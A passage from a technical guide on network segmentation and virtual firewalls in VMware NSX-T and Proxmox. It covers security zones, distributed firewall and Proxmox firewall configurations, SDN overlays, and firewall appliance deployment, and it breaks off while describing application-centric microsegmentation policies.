# Network Segmentation and Virtual Firewalls in VMware/Proxmox Environments

## Table of Contents

1. [Network Segmentation Theory](#1-network-segmentation-theory)
2. [VMware NSX-T Architecture](#2-vmware-nsx-t-architecture)
3. [Proxmox SDN](#3-proxmox-sdn)
4. [Virtual Firewall Appliances](#4-virtual-firewall-appliances)
5. [Microsegmentation Implementation](#5-microsegmentation-implementation)
6. [Inter-VLAN Routing Security](#6-inter-vlan-routing-security)
7. [Storage Network Security](#7-storage-network-security)
8. [Management Network Isolation](#8-management-network-isolation)
9. [Monitoring Segmented Environments](#9-monitoring-segmented-environments)
10. [Penetration Testing Virtual Networks](#10-penetration-testing-virtual-networks)

---

## 1. Network Segmentation Theory

### 1.1 Defense-in-Depth Through Segmentation

Network segmentation is the foundational architectural practice of partitioning a flat network into discrete security zones, each governed by independent access control policies. In virtualized environments, segmentation transcends physical topology — it becomes a software-defined construct enforced at the hypervisor kernel, the virtual switch, and the overlay network layer.

The defense-in-depth model treats segmentation as a series of concentric barriers:

```
┌──────────────────────────────────────────────────────────────┐
│                    INTERNET / UNTRUSTED                       │
├──────────────────────────────────────────────────────────────┤
│  ┌─────────────────────────────────────────────────────────┐ │
│  │                  PERIMETER FIREWALL                      │ │
│  ├─────────────────────────────────────────────────────────┤ │
│  │  ┌──────────────────────────────────────────────────┐   │ │
│  │  │                    DMZ ZONE                       │   │ │
│  │  │   Web Servers │ Reverse Proxies │ WAF            │   │ │
│  │  ├──────────────────────────────────────────────────┤   │ │
│  │  │  ┌───────────────────────────────────────────┐   │   │ │
│  │  │  │           APPLICATION ZONE                │   │   │ │
│  │  │  │   App Servers │ Middleware │ APIs         │   │   │ │
│  │  │  ├───────────────────────────────────────────┤   │   │ │
│  │  │  │  ┌────────────────────────────────────┐   │   │   │ │
│  │  │  │  │         DATABASE ZONE              │   │   │   │ │
│  │  │  │  │   RDBMS │ Cache │ Message Queues   │   │   │   │ │
│  │  │  │  ├────────────────────────────────────┤   │   │   │ │
│  │  │  │  │  ┌─────────────────────────────┐   │   │   │   │ │
│  │  │  │  │  │    MANAGEMENT ZONE          │   │   │   │   │ │
│  │  │  │  │  │  vCenter│Proxmox│Monitoring │   │   │   │   │ │
│  │  │  │  │  └─────────────────────────────┘   │   │   │   │ │
│  │  │  │  └────────────────────────────────────┘   │   │   │ │
│  │  │  └───────────────────────────────────────────┘   │   │ │
│  │  └──────────────────────────────────────────────────┘   │ │
│  └─────────────────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────────────────┘
```

Each boundary crossing requires explicit policy permission. The principle is that compromising one zone should not automatically grant access to adjacent zones.

### 1.2 Zone Classification

#### DMZ (Demilitarized Zone)

The DMZ houses services exposed to untrusted networks. In virtual environments, DMZ VMs must reside on dedicated port groups or VNets with no direct layer-2 adjacency to internal workloads. Critical constraints:

- No initiated connections from DMZ to internal zones (only responses to internal-originated connections or explicitly allowed paths)
- Hardened OS images with minimal attack surface
- Separate VLAN/VNI from all internal traffic
- Egress filtering to prevent data exfiltration

#### Internal/Production Zone

Production workloads that serve business logic. Subdivided further by application tier (web, app, database) or business unit. Inter-zone traffic requires explicit firewall rules.

#### Management Zone

Dedicated network for hypervisor management interfaces, BMC/IPMI, vCenter/Proxmox API, backup servers, and monitoring infrastructure. This zone must be unreachable from production workloads and accessible only via jump hosts or VPN with MFA.

#### Storage Zone

iSCSI, NFS, Ceph, and vSAN traffic. Isolated to prevent storage protocol exploitation from compromised workloads. Typically uses jumbo frames (MTU 9000) and dedicated NICs.

#### Backup Zone

Backup traffic between agents and backup servers. Air-gapped or logically isolated to prevent ransomware from reaching backup repositories. Immutable backup targets should reside on networks with no inbound management except from the backup controller.

### 1.3 Traffic Flow Modeling

#### North-South Traffic

Traffic entering or leaving the data center boundary — ingress from the internet, egress to external services, VPN tunnels. This traffic crosses the perimeter firewall and is subject to:

- Stateful inspection
- IDS/IPS inspection
- SSL/TLS termination and inspection
- DDoS mitigation
- Geo-IP filtering

#### East-West Traffic

Lateral traffic between workloads within the data center. In traditional architectures, east-west traffic often bypasses perimeter firewalls entirely. This is precisely the gap microsegmentation addresses. In VMware environments, east-west traffic between VMs on the same ESXi host never touches the physical network — it is switched internally by the vSwitch or VDS.

```
North-South (Perimeter):
    Internet ←──→ [Perimeter FW] ←──→ DMZ ←──→ [Internal FW] ←──→ Apps

East-West (Lateral):
    VM-A ←──→ [DFW/vSwitch Policy] ←──→ VM-B (same host)
    VM-A ←──→ [Physical Switch] ←──→ VM-C (different host)
```

The ratio in modern data centers is approximately 80% east-west to 20% north-south. Segmentation strategies must prioritize east-west control.

### 1.4 The Purdue Model for OT Environments

For environments with operational technology (OT) / industrial control systems (ICS), the Purdue Enterprise Reference Architecture defines hierarchical levels:

```
Level 5: Enterprise Network (ERP, Email, Internet)
         ─────────── IDMZ ───────────
Level 4: Site Business Planning (MES historians accessible to IT)
Level 3.5: DMZ between IT and OT
Level 3: Site Operations (Historians, OPC servers, Engineering workstations)
Level 2: Area Supervisory (HMI, SCADA)
Level 1: Basic Control (PLCs, RTUs, DCS controllers)
Level 0: Process (Sensors, Actuators, Physical process)
```

The Industrial DMZ (IDMZ) at Level 3.5 is the critical segmentation boundary. In virtualized OT environments:

- Level 3 and above may be virtualized on Proxmox/VMware
- Levels 0-2 remain on dedicated OT networks (Profinet, Modbus, EtherNet/IP)
- The IDMZ typically hosts data diodes, jump servers, and unidirectional gateways
- No direct routing between Level 5 and Level 2 or below

### 1.5 PCI-DSS Cardholder Data Environment Segmentation

PCI-DSS (Payment Card Industry Data Security Standard) requires that the Cardholder Data Environment (CDE) is segmented from all other systems such that a compromise of out-of-scope systems cannot reach cardholder data.

Requirements relevant to virtual segmentation:

- **Requirement 1.2**: Network segmentation must isolate the CDE from all non-CDE networks
- **Requirement 1.3**: Firewalls between DMZ, CDE, and wireless networks
- **Requirement 2.2**: Systems in the CDE must be hardened per configuration standards
- **Requirement 11.3.4**: Penetration testing must validate segmentation controls

In virtualized environments, the QSA (Qualified Security Assessor) evaluates whether:

1. Virtual switch port groups provide equivalent isolation to physical network segments
2. Hypervisor administrators with access to both CDE and non-CDE VMs represent a scoping risk
3. Shared storage between CDE and non-CDE workloads creates implicit connectivity
4. Management networks shared between CDE and non-CDE hosts constitute scope expansion

The guidance from the PCI SSC "Virtualization Guidelines" information supplement states that if the hypervisor is shared between CDE and non-CDE workloads, the hypervisor is in scope for PCI-DSS.

---

## 2. VMware NSX-T Architecture

### 2.1 Distributed Firewall (DFW)

The NSX-T Distributed Firewall operates at the kernel level within the ESXi hypervisor, enforcing security policy at the vNIC of each virtual machine. This placement is architecturally significant:

```
┌─────────────────────────────────────────────────────┐
│                    ESXi Host                         │
│                                                     │
│  ┌──────────┐   ┌──────────┐   ┌──────────┐       │
│  │   VM-A   │   │   VM-B   │   │   VM-C   │       │
│  │  [vNIC]  │   │  [vNIC]  │   │  [vNIC]  │       │
│  └────┬─────┘   └────┬─────┘   └────┬─────┘       │
│       │               │               │             │
│  ┌────▼─────┐   ┌────▼─────┐   ┌────▼─────┐       │
│  │DFW Filter│   │DFW Filter│   │DFW Filter│       │
│  └────┬─────┘   └────┬─────┘   └────┬─────┘       │
│       │               │               │             │
│  ┌────▼───────────────▼───────────────▼─────┐      │
│  │            N-VDS (Virtual Switch)         │      │
│  └───────────────────┬──────────────────────┘      │
│                      │                              │
│              ┌───────▼───────┐                      │
│              │  Physical NIC  │                      │
│              └───────────────┘                      │
└─────────────────────────────────────────────────────┘
```

Key properties of kernel-level enforcement:

- **Wire speed**: DFW rules are processed in the ESXi kernel data plane (vSphere Distributed Switch dvFilter framework), achieving near-line-rate throughput
- **VM cannot bypass**: Since the filter sits between the vNIC and the virtual switch, no guest OS configuration can circumvent it
- **Follows the workload**: When a VM is vMotioned, its DFW policy migrates with it
- **Stateful inspection**: Full connection tracking with 5-tuple state tables per vNIC

#### DFW Rule Structure

NSX-T DFW rules are organized in sections, processed top-to-bottom within each category:

```
Category Priority (highest to lowest):
  1. Ethernet (L2 rules)
  2. Emergency
  3. Infrastructure
  4. Environment
  5. Application
  6. Default (implicit deny or allow depending on configuration)
```

Example DFW rule configuration (NSX-T Policy API):

```json
{
  "display_name": "Block-Lateral-Movement-Database-Tier",
  "category": "Application",
  "sequence_number": 100,
  "stateful": true,
  "rules": [
    {
      "display_name": "Allow-App-to-DB-MySQL",
      "source_groups": ["/infra/domains/default/groups/app-tier"],
      "destination_groups": ["/infra/domains/default/groups/db-tier"],
      "services": ["/infra/services/MySQL"],
      "action": "ALLOW",
      "direction": "IN_OUT",
      "ip_protocol": "IPV4_IPV6",
      "logged": true,
      "sequence_number": 1
    },
    {
      "display_name": "Deny-All-to-DB",
      "source_groups": ["ANY"],
      "destination_groups": ["/infra/domains/default/groups/db-tier"],
      "services": ["ANY"],
      "action": "DROP",
      "direction": "IN_OUT",
      "logged": true,
      "sequence_number": 2
    }
  ]
}
```

### 2.2 Gateway Firewall

The NSX-T Gateway Firewall operates on Tier-0 and Tier-1 gateways, enforcing policies on north-south traffic that traverses the gateway routers. It provides:

- Stateful L4 firewall on gateway uplinks
- URL filtering (with Advanced Threat Prevention license)
- TLS inspection
- IDS/IPS at the gateway level
- NAT integration

Unlike the DFW (east-west), the Gateway Firewall inspects traffic as it crosses routing boundaries.

### 2.3 Micro-segmentation with Security Groups and Tags

NSX-T decouples security policy from network topology through:

#### Security Tags

Metadata labels attached to VMs or workload interfaces. Tags are assigned manually, via automation (Ansible, Terraform), or through integration with orchestration platforms (vRA, Kubernetes).

```
Tag Examples:
  - environment:production
  - tier:web
  - compliance:pci-dss
  - team:payments
  - os:linux
```

#### Security Groups (NS Groups)

Dynamic membership groups based on criteria:

- Tag-based: All VMs with tag `tier:database`
- IP-based: CIDR ranges
- Segment-based: All VMs on a specific logical segment
- AD Group-based: VMs belonging to Active Directory security groups (with identity firewall)

```json
{
  "display_name": "PCI-Database-Servers",
  "membership_criteria": [
    {
      "resource_type": "NSGroupTagExpression",
      "target_type": "VirtualMachine",
      "tag": "compliance",
      "scope": "pci-dss"
    },
    {
      "resource_type": "NSGroupTagExpression",
      "target_type": "VirtualMachine",
      "tag": "tier",
      "scope": "database"
    }
  ]
}
```

### 2.4 NSX-T Networking Model

```
┌─────────────────────────────────────────────────────────────┐
│                     Physical Network                          │
│                                                              │
│  ┌────────────────────────────────────────────────────────┐  │
│  │              Tier-0 Gateway (SR/DR)                     │  │
│  │      BGP Peering │ ECMP │ North-South NAT              │  │
│  └───────────┬───────────────────────┬────────────────────┘  │
│              │                       │                        │
│  ┌───────────▼──────────┐  ┌────────▼───────────────────┐   │
│  │  Tier-1 GW (Prod)    │  │   Tier-1 GW (Dev)          │   │
│  │  Connected Segments:  │  │   Connected Segments:       │   │
│  │   - web-prod-seg      │  │    - web-dev-seg            │   │
│  │   - app-prod-seg      │  │    - app-dev-seg            │   │
│  │   - db-prod-seg       │  │    - db-dev-seg             │   │
│  └───────────────────────┘  └────────────────────────────┘   │
│                                                              │
│  Overlay Transport Zone (GENEVE encapsulation)               │
│  TEP IPs: 10.10.50.0/24 (Transport Endpoint Pool)           │
└─────────────────────────────────────────────────────────────┘
```

#### Segments (Logical Switches)

NSX-T segments replace traditional VLANs for overlay-based networking. Each segment is identified by a Virtual Network Identifier (VNI) and encapsulated in GENEVE (Generic Network Virtualization Encapsulation — successor to VXLAN in NSX-T 3.x+).

#### Tier-0 Gateway

The Tier-0 gateway connects the NSX-T overlay to the physical network. It runs BGP or static routes with ToR (Top-of-Rack) switches, provides ECMP load balancing, and handles north-south NAT/firewall policies.

#### Tier-1 Gateway

Tier-1 gateways provide tenant or workload isolation. They connect to Tier-0 via an internal transit link and host connected segments. Tier-1 gateways can run distributed routing (DR) across all transport nodes or active-standby service routing (SR) for stateful services.

### 2.5 Overlay Networking: GENEVE and VXLAN

GENEVE (Generic Network Virtualization Encapsulation) is the overlay protocol in NSX-T 3.x+:

```
Original Frame:
[Eth Header][IP Header][TCP/UDP][Payload]

GENEVE Encapsulated:
[Outer Eth][Outer IP][Outer UDP:6081][GENEVE Header (VNI + Options)][Original Frame]
```

GENEVE advantages over VXLAN:
- Variable-length options (Type-Length-Value) for extensibility
- Carries metadata (security tags, tracing info) in the tunnel header
- Protocol-agnostic option fields for future features

Transport Endpoint (TEP) interfaces on each ESXi host handle encapsulation/decapsulation. TEP-to-TEP communication uses the physical underlay (typically dedicated VLAN with jumbo frames).

### 2.6 Service Insertion for Third-Party Firewalls

NSX-T supports redirecting traffic to third-party security appliances (Palo Alto, Check Point, Fortinet) via service insertion:

```
Traffic Flow with Service Insertion:
  VM-A → [DFW Pre-rules] → [Service Chain: PA VM-Series] → [DFW Post-rules] → VM-B
```

Service insertion uses a partner appliance registered via the NSX-T Service Insertion framework (East-West service insertion or North-South). Traffic is redirected transparently without modifying VM networking.

---

## 3. Proxmox SDN

### 3.1 VXLAN/EVPN Configuration

Proxmox VE (starting from version 7.x) includes a built-in SDN module that supports overlay networking through VXLAN and BGP EVPN. Configuration is managed via the web UI or the `/etc/pve/sdn/` configuration files replicated across cluster nodes.

#### VXLAN Zone Configuration

```ini
# /etc/pve/sdn/zones.cfg

vxlan: overlay-zone
    peers 10.10.1.1,10.10.1.2,10.10.1.3
    ipam pve
    mtu 1450
    dns dnsserver
    dnszone overlay.local
    reversedns 10.in-addr.arpa
```

#### EVPN Zone Configuration (BGP-based)

```ini
# /etc/pve/sdn/zones.cfg

evpn: evpn-zone
    controller evpn-ctrl
    vrf-vxlan 5000
    mac aa:bb:cc:dd:ee:ff
    ipam pve
    exitnodes node1,node2
    exitnodes-primary node1

# /etc/pve/sdn/controllers.cfg

evpn: evpn-ctrl
    asn 65001
    peers 10.10.1.1,10.10.1.2,10.10.1.3
```

The EVPN controller uses FRRouting (FRR) on each Proxmox node to establish iBGP peering and distribute MAC/IP reachability information for the overlay.

### 3.2 Zone Types

Proxmox SDN supports multiple zone types for different isolation requirements:

| Zone Type | Use Case | Isolation | Complexity |
|-----------|----------|-----------|------------|
| Simple | Flat L2 bridged | None (all VNets on same bridge) | Low |
| VLAN | Traditional 802.1Q tagging | VLAN tags | Low |
| QinQ | Nested VLANs (802.1ad) | Service tag + Customer tag | Medium |
| VXLAN | Overlay without control plane | VNI-based L2 isolation | Medium |
| EVPN | Full overlay with BGP control plane | VNI + VRF + BGP | High |

#### QinQ for Tenant Isolation

```ini
# /etc/pve/sdn/zones.cfg

qinq: tenant-isolation
    bridge vmbr0
    tag 100
    vlan-protocol 802.1ad
    mtu 1500
```

QinQ allows nested VLAN encapsulation — the provider assigns a service tag (S-VLAN) and the tenant uses their own customer tags (C-VLAN) within.

### 3.3 Subnet Management and DHCP Integration

```ini
# /etc/pve/sdn/subnets.cfg

subnet: overlay-zone-10.100.1.0-24
    vnet vnet-web
    gateway 10.100.1.1
    snat 1
    dhcp-range start-address=10.100.1.100,end-address=10.100.1.200
    dnszoneprefix web
```

DHCP is provided by `dnsmasq` instances spawned per subnet. The Proxmox IPAM (IP Address Management) tracks allocations and prevents conflicts.

### 3.4 VNet Isolation

VNets are the logical network constructs within a zone. Each VNet maps to a bridge interface on the Proxmox host:

```ini
# /etc/pve/sdn/vnets.cfg

vnet: vnet-web
    zone overlay-zone
    tag 100100
    alias "Web Tier Network"

vnet: vnet-app
    zone overlay-zone
    tag 100200
    alias "Application Tier Network"

vnet: vnet-db
    zone overlay-zone
    tag 100300
    alias "Database Tier Network"
```

VMs attach to VNets just as they would attach to traditional bridges. The SDN module creates per-node bridge interfaces dynamically.

### 3.5 Proxmox Firewall Rules

Proxmox provides a three-level firewall hierarchy:

```
Datacenter Level → Host Level → VM/CT Level
   (cluster.fw)     (host.fw)    (<vmid>.fw)
```

#### Datacenter-Level Rules

```ini
# /etc/pve/firewall/cluster.fw

[OPTIONS]
enable: 1
policy_in: DROP
policy_out: ACCEPT
log_ratelimit: enabled=1,rate=1/second,burst=5

[IPSET management]
10.0.0.0/24
192.168.100.0/24

[IPSET dns_servers]
10.0.0.53
10.0.0.54

[RULES]
GROUP management-access -i vmbr0
IN ACCEPT -source +management -dest +management -p tcp -dport 8006 -log nolog
IN ACCEPT -source +management -p tcp -dport 22 -log nolog
IN DROP -log warning
```

#### VM-Level Rules

```ini
# /etc/pve/firewall/100.fw

[OPTIONS]
enable: 1
policy_in: DROP
policy_out: ACCEPT
dhcp: 0
ipfilter: 1
macfilter: 1

[RULES]
# Allow HTTP/HTTPS from any
IN ACCEPT -p tcp -dport 80
IN ACCEPT -p tcp -dport 443

# Allow SSH from management only
IN ACCEPT -source 10.0.0.0/24 -p tcp -dport 22

# Allow ICMP for monitoring
IN ACCEPT -p icmp

# Explicit deny with logging
IN DROP -log warning
```

#### Security Groups (Reusable Rule Sets)

```ini
# /etc/pve/firewall/cluster.fw

[group web-server]
IN ACCEPT -p tcp -dport 80
IN ACCEPT -p tcp -dport 443
IN ACCEPT -p tcp -dport 22 -source 10.0.0.0/24

[group database-server]
IN ACCEPT -p tcp -dport 3306 -source 10.100.2.0/24
IN ACCEPT -p tcp -dport 5432 -source 10.100.2.0/24
IN ACCEPT -p tcp -dport 22 -source 10.0.0.0/24
```

### 3.6 Integration with OVN (Open Virtual Network)

OVN provides a higher-level abstraction over Open vSwitch (OVS) for Proxmox environments requiring advanced SDN features:

```bash
# OVN Northbound database — logical network definition
ovn-nbctl ls-add web-switch
ovn-nbctl ls-add app-switch
ovn-nbctl ls-add db-switch

# Create logical router
ovn-nbctl lr-add tenant-router

# Connect switches to router
ovn-nbctl lrp-add tenant-router rtr-to-web 02:ac:10:01:00:01 10.100.1.1/24
ovn-nbctl lsp-add web-switch web-to-rtr
ovn-nbctl lsp-set-type web-to-rtr router
ovn-nbctl lsp-set-addresses web-to-rtr router
ovn-nbctl lsp-set-options web-to-rtr router-port=rtr-to-web

# ACL rules on OVN logical switches
# Allow HTTP inbound to web tier
ovn-nbctl acl-add web-switch to-lport 1000 \
  'inport == "web-to-rtr" && ip4.dst == 10.100.1.0/24 && tcp.dst == 80' allow

# Deny all other inbound to web tier
ovn-nbctl acl-add web-switch to-lport 900 \
  'inport == "web-to-rtr"' drop

# Allow web tier to app tier on port 8080
ovn-nbctl acl-add app-switch to-lport 1000 \
  'ip4.src == 10.100.1.0/24 && tcp.dst == 8080' allow

# Deny direct web-to-database
ovn-nbctl acl-add db-switch to-lport 1100 \
  'ip4.src == 10.100.1.0/24' drop

# Allow app-to-database on MySQL
ovn-nbctl acl-add db-switch to-lport 1000 \
  'ip4.src == 10.100.2.0/24 && tcp.dst == 3306' allow
```

### 3.7 BGP EVPN for Multi-Site

For multi-site Proxmox deployments, BGP EVPN provides L2 extension and L3 routing across sites:

```ini
# /etc/frr/frr.conf (per Proxmox node)

frr version 8.5
frr defaults datacenter

router bgp 65001
 bgp router-id 10.10.1.1
 no bgp default ipv4-unicast
 neighbor EVPN-PEERS peer-group
 neighbor EVPN-PEERS remote-as 65001
 neighbor EVPN-PEERS update-source lo
 neighbor EVPN-PEERS bfd
 neighbor 10.10.1.2 peer-group EVPN-PEERS
 neighbor 10.10.1.3 peer-group EVPN-PEERS

 address-family l2vpn evpn
  neighbor EVPN-PEERS activate
  advertise-all-vni
  advertise-svi-ip
 exit-address-family

router bgp 65001 vrf vrf-tenant1
 bgp router-id 10.10.1.1
 address-family ipv4 unicast
  redistribute connected
  redistribute static
 exit-address-family
 address-family l2vpn evpn
  advertise ipv4 unicast
  rd 10.10.1.1:5000
  route-target import 65001:5000
  route-target export 65001:5000
 exit-address-family
```

---

## 4. Virtual Firewall Appliances

### 4.1 Deploying pfSense/OPNsense as VM

#### Sizing Guidelines

| Throughput Target | vCPUs | RAM | Disk | Notes |
|-------------------|-------|-----|------|-------|
| < 1 Gbps (no IDS) | 2 | 2 GB | 16 GB | Basic routing + firewall |
| 1-5 Gbps (no IDS) | 4 | 4 GB | 32 GB | Medium workloads |
| 1-5 Gbps (with Suricata) | 8 | 8 GB | 64 GB | IDS/IPS requires CPU |
| 10 Gbps+ | 8-16 | 16 GB | 128 GB | Requires SR-IOV/DPDK |

#### Interface Mapping on Proxmox

```ini
# VM Configuration (e.g., /etc/pve/qemu-server/200.conf)

cores: 4
memory: 4096
name: opnsense-fw01
ostype: other
scsihw: virtio-scsi-single

# WAN Interface — connected to external-facing bridge
net0: virtio=AA:BB:CC:00:00:01,bridge=vmbr1,firewall=0

# LAN Interface — internal production
net1: virtio=AA:BB:CC:00:00:02,bridge=vmbr0,firewall=0,tag=100

# DMZ Interface
net2: virtio=AA:BB:CC:00:00:03,bridge=vmbr0,firewall=0,tag=200

# Management Interface (OPT1)
net3: virtio=AA:BB:CC:00:00:04,bridge=vmbr0,firewall=0,tag=10

# Sync Interface for HA (CARP)
net4: virtio=AA:BB:CC:00:00:05,bridge=vmbr2,firewall=0
```

Note: `firewall=0` on the Proxmox side because the VM itself IS the firewall — having Proxmox firewall rules on these interfaces creates double-filtering and complicates troubleshooting.

#### High Availability (HA) with CARP

OPNsense/pfSense HA requires:
- A dedicated sync interface (pfsync) between primary and secondary
- CARP virtual IPs on each interface
- State synchronization for connection table failover

```
┌──────────────┐    pfsync (vmbr2)    ┌──────────────┐
│  OPNsense-1  │◄───────────────────► │  OPNsense-2  │
│   (Primary)  │                      │  (Secondary)  │
│              │                      │              │
│  WAN: CARP  │                      │  WAN: CARP  │
│  LAN: CARP  │                      │  LAN: CARP  │
│  DMZ: CARP  │                      │  DMZ: CARP  │
└──────────────┘                      └──────────────┘
```

### 4.2 FortiGate-VM Deployment on Proxmox

FortiGate-VM requires specific virtio or e1000 interface configuration depending on FortiOS version:

```bash
# Download FortiGate-VM qcow2 image
# Convert to Proxmox-compatible format
qm create 201 --name fortigate-vm --memory 4096 --cores 4 \
  --scsihw virtio-scsi-single

# Import disk
qm importdisk 201 fortios.qcow2 local-zfs

# Attach disk
qm set 201 --scsi0 local-zfs:vm-201-disk-0

# Add interfaces
qm set 201 --net0 virtio,bridge=vmbr1  # port1 = WAN/mgmt
qm set 201 --net1 virtio,bridge=vmbr0,tag=100  # port2 = Internal
qm set 201 --net2 virtio,bridge=vmbr0,tag=200  # port3 = DMZ
qm set 201 --net3 virtio,bridge=vmbr0,tag=300  # port4 = HA heartbeat

# Set boot order
qm set 201 --boot order=scsi0
```

FortiGate-VM licensing:
- BYOL (Bring Your Own License) — perpetual or subscription
- PAYG (Pay As You Go) — cloud marketplaces only
- Evaluation — 15-day trial, limited throughput

### 4.3 Palo Alto VM-Series on ESXi

Palo Alto VM-Series deployment on ESXi requires specific vSwitch configuration:

```
Required Port Groups:
  - Management: Dedicated management port group (no trunk)
  - Dataplane interfaces: Separate port groups per zone
  - HA: Dedicated HA port group with jumbo frames

vSwitch Configuration:
  - Promiscuous mode: REJECT (except for transparent mode)
  - MAC address changes: REJECT
  - Forged transmits: REJECT (except for HA/VRRP)
  - Security policy override at port group level for HA
```

VM-Series sizing tiers:

| Model | vCPUs | RAM | Throughput (App-ID) | Session Capacity |
|-------|-------|-----|---------------------|------------------|
| VM-50 | 2 | 5.5 GB | 200 Mbps | 64,000 |
| VM-100 | 2 | 6.5 GB | 2 Gbps | 250,000 |
| VM-300 | 2-4 | 9 GB | 4 Gbps | 830,000 |
| VM-500 | 4-8 | 16 GB | 8 Gbps | 2,000,000 |
| VM-700 | 16 | 56 GB | 16 Gbps | 10,000,000 |

### 4.4 Sophos XG Virtual

Sophos XG (now Sophos Firewall) deploys as a VM with support for both ESXi and KVM/Proxmox:

```bash
# Proxmox deployment
qm create 202 --name sophos-xg --memory 6144 --cores 4
qm importdisk 202 sophos-xg.qcow2 local-zfs
qm set 202 --scsi0 local-zfs:vm-202-disk-0
qm set 202 --net0 virtio,bridge=vmbr0,tag=10   # Port A - Management/LAN
qm set 202 --net1 virtio,bridge=vmbr1           # Port B - WAN
qm set 202 --net2 virtio,bridge=vmbr0,tag=200   # Port C - DMZ
qm set 202 --net3 virtio,bridge=vmbr0,tag=100   # Port D - Internal servers
qm set 202 --boot order=scsi0
qm set 202 --serial0 socket  # Console access
```

### 4.5 OPNsense Transparent Bridge Mode

Transparent bridge mode allows inline inspection without IP addressing — the firewall is invisible at Layer 3:

```
                    Bridge Mode Topology:
    ┌──────────┐                              ┌──────────┐
    │ Upstream  │──►[Bridge Port 1]──[OPNsense]──[Bridge Port 2]──►│ Downstream│
    │  Router   │     (no IP)      Inspection     (no IP)         │ Network   │
    └──────────┘                                                  └──────────┘
```

Configuration steps in OPNsense:
1. Assign interfaces as bridge members (Interfaces → Other Types → Bridge)
2. Configure filtering bridge (`net.link.bridge.pfil_bridge=1` in `/boot/loader.conf.local`)
3. Apply firewall rules to the bridge interface
4. No IP required on bridge members — management via dedicated OPT interface

Use cases:
- Inserting IDS/IPS inline without re-addressing
- Adding firewall to an existing flat network without topology changes
- Compliance insertion (PCI-DSS) with minimal disruption

### 4.6 Performance Tuning

#### Virtio vs E1000 vs VMXNET3

| Driver | Platform | Max Throughput | CPU Overhead | Features |
|--------|----------|---------------|--------------|----------|
| virtio-net | KVM/Proxmox | 10-40 Gbps | Low | Multi-queue, TSO, GSO |
| e1000 | ESXi/KVM | 1 Gbps | High | Universal compatibility |
| vmxnet3 | ESXi | 10-25 Gbps | Low | TSO, LRO, RSS, vRSS |
| DPDK (user-space) | Both | 40+ Gbps | Dedicated cores | Zero-copy, poll-mode |
| SR-IOV (VF passthrough) | Both | Wire speed | Minimal | Hardware offload |

#### DPDK Configuration for NFV Firewall

```bash
# /etc/dpdk/dpdk.conf (inside firewall VM)
# Bind NICs to DPDK-compatible driver
dpdk-devbind --bind=vfio-pci 0000:00:04.0
dpdk-devbind --bind=vfio-pci 0000:00:05.0

# Hugepages allocation (host and guest)
echo 2048 > /sys/kernel/mm/hugepages/hugepages-2048kB/nr_hugepages

# Proxmox VM config for hugepages passthrough
qm set 200 --hugepages 1024
qm set 200 --numa 1
```

#### SR-IOV for Virtual Firewall

```bash
# Enable SR-IOV VFs on the host NIC (Intel X710 example)
echo 8 > /sys/class/net/ens1f0/device/sriov_numvfs

# Assign VF to firewall VM via Proxmox
qm set 200 --hostpci0 0000:04:02.0,pcie=1

# Verify inside VM
lspci | grep -i virtual
# 00:04.0 Ethernet controller: Intel Corporation X710 Virtual Function
```

SR-IOV bypasses the virtual switch entirely, giving the firewall VM direct hardware access with zero hypervisor overhead. Trade-off: vMotion/live migration requires hot-unplug of VF and reassignment on the destination host.

---

## 5. Microsegmentation Implementation

### 5.1 Workload Classification and Grouping

Before implementing microsegmentation, classify workloads into logical groups. The taxonomy should reflect:

1. **Application affinity**: Which VMs constitute a single application?
2. **Communication requirements**: Which VMs need to talk to each other?
3. **Trust level**: What is the sensitivity of data handled?
4. **Compliance scope**: Is this workload in PCI, HIPAA, or SOX scope?
5. **Environment**: Production, staging, development, testing?

```
Classification Matrix Example:

┌──────────────┬─────────────┬───────────┬──────────┬────────────┐
│ Application  │ Tier        │ Trust     │ Comply   │ Environment│
├──────────────┼─────────────┼───────────┼──────────┼────────────┤
│ E-Commerce   │ Web         │ Low       │ PCI      │ Prod       │
│ E-Commerce   │ App         │ Medium    │ PCI      │ Prod       │
│ E-Commerce   │ Database    │ High      │ PCI      │ Prod       │
│ HR Portal    │ Web         │ Medium    │ GDPR     │ Prod       │
│ HR Portal    │ Database    │ Critical  │ GDPR     │ Prod       │
│ Dev Sandbox  │ All         │ Low       │ None     │ Dev        │
│ Monitoring   │ Collector   │ High      │ Internal │ Infra      │
└──────────────┴─────────────┴───────────┴──────────┴────────────┘
```

### 5.2 Policy Design: Deny-by-Default, Allow-by-Exception

The fundamental policy model for microsegmentation:

```
Default Policy: DENY ALL (east-west)

Exceptions are added per validated communication requirement:
  Source Group → Destination Group : Protocol : Port : Justification
```

Policy lifecycle:

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│   Discover   │───►│    Draft     │───►│   Simulate   │───►│   Enforce    │
│   (Flows)    │    │  (Policies)  │    │  (Monitor)   │    │   (Block)    │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
      │                                        │                     │
      │         Alert on would-be-blocked      │    Alert on actual  │
      └────────────────────────────────────────┘    blocked traffic  │
                                                                     │
                                                    Continuous review │
                                                    and tightening   ▼
```

### 5.3 Tag-Based Policies

Tag-based microsegmentation decouples policy from IP addresses entirely:

```
Policy: "web-to-app-allowed"
  IF source.tag CONTAINS "tier:web"
  AND destination.tag CONTAINS "tier:app"
  AND destination.tag CONTAINS "app:ecommerce"
  AND protocol == TCP
  AND destination.port IN [8080, 8443]
  THEN ALLOW
  ELSE DENY

Policy: "no-lateral-within-tier"
  IF source.tag CONTAINS "tier:web"
  AND destination.tag CONTAINS "tier:web"
  AND source != destination
  THEN DENY
```

This prevents lateral movement between web servers even if they share the same VLAN/segment.

### 5.4 Identity-Based Segmentation

NSX-T Identity Firewall (IDFW) integrates with Active Directory to create policies based on logged-in user identity:

```json
{
  "display_name": "Finance-Users-Only-Access",
  "rules": [
    {
      "source_groups": ["/infra/domains/default/groups/ad-finance-group"],
      "destination_groups": ["/infra/domains/default/groups/finance-servers"],
      "services": ["/infra/services/RDP", "/infra/services/HTTPS"],
      "action": "ALLOW",
      "direction": "IN_OUT"
    },
    {
      "source_groups": ["ANY"],
      "destination_groups": ["/infra/domains/default/groups/finance-servers"],
      "action": "DROP"
    }
  ]
}
```

When a user from the Finance AD group logs into any workstation, their traffic to finance servers is allowed. Other users on the same network segment are denied.

### 5.5 Application-Centric Policies

Model policies around application communication patterns rather than network constructs:

```
Application: "Payment Processing Service"
Components:
  - payment-web (port 443 inbound from load balancer)
  - payment-api (port 8443 from payment-web only)
  - payment-worker (port 5672 from payment-api, RabbitMQ)
